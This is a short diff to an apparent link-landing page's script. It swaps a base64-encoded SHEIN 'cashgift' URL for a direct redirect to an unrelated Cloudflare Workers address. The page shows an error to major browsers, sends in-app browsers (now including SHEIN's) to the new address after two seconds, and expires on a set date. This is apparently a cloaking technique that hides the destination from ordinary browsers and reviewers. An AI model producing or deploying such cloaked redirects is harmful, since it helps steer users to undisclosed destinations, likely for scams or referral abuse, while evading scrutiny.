@@ -41,14 +41,15 @@
   <script>
     const expiry = new Date("2025-07-15T23:59:59").getTime();
     const now = new Date().getTime();
-    const encodedURL = "aHR0cHM6Ly9hcGktc2hlaW4uc2hlaW4uY29tL3Vncm93dGgvZ2FtZS9jYXNoZ2lmdC8/dHlwZT1pbW1lcnNpdmUmbmF2aWdhdGlvbl90cmFuc3BhcmVudD1mYWxzZSZuYXZpZ2F0aW9uPXRydWUmcGFnZV9mcm9tPWNhc2hyZXdhcmQmYXBwPXNoZWluJmRldmljZV90eXBlPWFuZHJvaWQmbGFuZ3VhZ2U9ZW4mc2l0ZV91aWQ9YW5kc2hwaCZyZWdpb249UEg=";
 
-    // Only block known major browsers
+    // Cloudflare Worker direct link (no base64)
+    const redirectURL = "https://hchejes.itzmebenz13.workers.dev/";
+
     function isMajorBrowser() {
       const ua = navigator.userAgent.toLowerCase();
       return (
         /chrome|crios|safari|firefox|edg|edge|opera|opr|ucbrowser/.test(ua) &&
-        !/instagram|fbav|line|wechat|inapp|wv/.test(ua) // exclude known in-apps
+        !/instagram|fbav|line|wechat|inapp|wv|shein/.test(ua) // allow in-apps like SHEIN
       );
     }
 
@@ -60,7 +61,7 @@
       document.getElementById("errorMessage").style.display = "block";
     } else {
       setTimeout(() => {
-        window.location.href = atob(encodedURL);
+        window.location.href = redirectURL;
       }, 2000);
     }
   </script>
